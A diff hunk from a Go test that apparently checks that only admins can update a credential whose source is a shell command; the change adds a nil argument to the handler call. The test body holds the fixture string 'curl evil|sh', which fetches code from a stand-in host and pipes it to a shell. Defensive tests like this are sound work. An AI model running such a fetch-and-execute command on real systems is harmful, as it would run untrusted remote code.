@@ -41,7 +41,7 @@ func TestUpdateCredentialCommandSourceAdminOnly(t *testing.T) {
 	}
 	const body = `{"name":"c","kind":"env","source":"command","secret":"curl evil|sh"}`
 	call := func(role user.Role, store credential.Store) *httptest.ResponseRecorder {
-		h := updateCredentialHandler(store, sealer, &authorizer{}, zap.NewNop())
+		h := updateCredentialHandler(store, nil, sealer, &authorizer{}, zap.NewNop())
 		req := httptest.NewRequest(http.MethodPut, "/v1/credentials/cred_1", strings.NewReader(body))
 		req.SetPathValue("id", "cred_1")
 		req = req.WithContext(context.WithValue(req.Context(), actorKey{}, Actor{UserID: "u", Role: role}))
